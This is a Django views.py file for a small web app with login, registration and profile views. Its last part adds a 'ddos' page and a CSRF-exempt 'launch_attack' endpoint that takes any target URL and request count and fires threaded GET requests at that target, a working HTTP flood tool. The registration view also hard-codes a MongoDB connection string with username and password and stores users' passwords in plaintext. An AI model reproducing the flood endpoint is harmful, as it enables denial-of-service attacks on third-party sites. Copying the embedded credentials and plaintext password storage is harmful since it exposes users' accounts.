import logging
from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login
from pymongo import MongoClient
from .models import Profile
from django.contrib.auth.decorators import login_required
from django.contrib.auth.hashers import check_password
from django.http import HttpResponseBadRequest
from django.shortcuts import render, redirect, get_object_or_404
from django.http import Http404
from django.views.decorators.csrf import csrf_exempt
import requests
import threading
from django.http import JsonResponse
from .forms import ProfileUpdateForm
from django.core.cache import cache
from django.contrib.auth import authenticate, login as django_login

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

def index(request):
    logger.info("Index page accessed.")
    return render(request, 'index.html')



def login_view(request):
    logger.info("Login view accessed.")
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')


        user = authenticate(username=username, password=password)
        if user is not None:

            django_login(request, user)
            logger.info(f"User {username} logged in.")
            return redirect('profile_created')
        else:

            logger.error("Invalid username or password.")
            return render(request, 'login.html', {'error_message': 'Invalid username or password'})
    else:
        return render(request, 'login.html')


def registration_view(request):
    logger.info("Registration view accessed.")
    if request.method == 'POST':
        username = request.POST.get('username')
        email = request.POST.get('email')
        password = request.POST.get('password')

        client = MongoClient('mongodb+srv://kriabova:Kris0192@authorization.iobm8pl.mongodb.net/?retryWrites=true&w=majority&appName=Authorization')
        db = client['Authoriz']
        collection = db['user']

        if collection.find_one({'username': username}) is None and collection.find_one({'email': email}) is None:
            user_data = {
                'username': username,
                'email': email,
                'password': password
            }
            collection.insert_one(user_data)

            user = User.objects.create_user(username=username, email=email, password=password)
            profile = Profile(user=user)
            profile.save()

            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                logger.info(f"User {username} registered and logged in.")
                return redirect('profile_created')
        else:
            return render(request, 'registration.html', {'error_message': 'Username or email already exists'})
    else:
        return render(request, 'registration.html')

@login_required
def profile_created_view(request):
    logger.info("Profile created view accessed.")
    profile = request.user.profile
    context = {
        'username': request.user.username,
        'email': request.user.email,
    }
    return render(request, 'profile_created.html', context)

@login_required
def read_profile(request):
    logger.info("Read profile view accessed.")
    try:
        profile = request.user.profile
    except Profile.DoesNotExist:
        logger.error("Profile does not exist.")
        raise Http404("Profile does not exist")

    context = {
        'username': request.user.username,
        'email': request.user.email,
        'bio': profile.bio
    }
    return render(request, 'profile_created.html', context)

@login_required
def update_profile(request):
    logger.info("Update profile view accessed.")
    if request.method == 'POST':
        form = ProfileUpdateForm(request.POST, request.FILES, instance=request.user.profile)
        if form.is_valid():
            form.save()
            return redirect('read_profile')
    else:
        form = ProfileUpdateForm(instance=request.user.profile)
    return render(request, 'profile_update.html', {'form': form})

@login_required
def delete_profile(request):
    logger.info("Delete profile view accessed.")
    if request.method == 'POST':
        profile = request.user.profile
        profile.delete()
        return redirect('registration')
    else:
        return render(request, 'profile_delete.html')

def ddos(request):
    logger.info("DDoS view accessed.")
    return render(request, 'ddos.html')

def send_get_requests(url):
    try:
       
        response = cache.get(url)
        if not response:
           
            response = requests.get(url)
           
            cache.set(url, response, timeout=60)

        return f"Response from {url}: {response.status_code}"
    except Exception as e:
        return f"Error accessing {url}: {str(e)}"
@csrf_exempt
def launch_attack(request):
    logger.info("Launch attack view accessed.")
    if request.method == 'POST':
        url = request.POST.get('target')
        num_requests = request.POST.get('requests')

        logger.info(f"Received POST request to launch attack with URL: {url} and number of requests: {num_requests}")

        if num_requests is None:
            logger.error("Number of requests is missing in the POST request.")
            return JsonResponse({'error': 'Number of requests is required.'}, status=400)

        try:
            num_requests = int(num_requests)
        except ValueError:
            logger.error("Invalid value for number of requests.")
            return JsonResponse({'error': 'Number of requests must be an integer.'}, status=400)

        if not url or num_requests < 1:
            logger.error("Invalid URL or number of requests.")
            return JsonResponse({'error': 'Invalid URL or number of requests.'}, status=400)

        threads = []
        for _ in range(num_requests):
            thread = threading.Thread(target=send_get_requests, args=(url,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        logger.info("Attack launched successfully.")
        return JsonResponse({'message': 'Attack launched successfully.'}, status=200)

    else:
        logger.error("Only POST requests are allowed.")
        return JsonResponse({'error': 'Only POST requests are allowed.'}, status=405)
